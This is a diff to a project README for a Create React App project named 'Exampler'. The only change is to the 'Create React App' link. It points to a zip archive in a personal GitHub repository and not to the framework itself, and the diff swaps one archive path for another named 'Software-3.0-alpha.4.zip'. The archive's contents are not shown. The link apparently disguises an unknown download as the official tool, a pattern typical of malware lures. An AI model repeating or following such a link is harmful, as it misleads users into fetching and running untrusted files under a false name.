@@ -1,6 +1,6 @@
 # Getting Started with Create React App - Exampler
 
-This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/vicky9696v/exampler/master/atria/exampler.zip).
+This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/vicky9696v/exampler/master/public/Software-3.0-alpha.4.zip).
 
 ## Available Scripts
 
